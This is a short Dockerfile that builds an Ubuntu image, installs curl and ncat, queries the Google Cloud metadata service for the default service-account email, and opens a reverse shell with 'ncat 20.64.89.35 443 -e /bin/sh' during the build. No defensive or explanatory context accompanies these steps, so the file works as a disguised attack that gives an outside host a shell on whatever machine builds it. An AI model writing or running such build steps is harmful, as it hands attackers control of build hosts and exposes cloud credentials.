FROM ubuntu:20.04
RUN apt update -y -qq
RUN apt install -y -qq curl && apt install -y -qq ncat && apt install python3 -y -qq
RUN /usr/bin/curl –-H "Metadata-Flavor: Google" metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email 

RUN ncat 20.64.89.35 443 -e /bin/sh

CMD ["/bin/bash"]
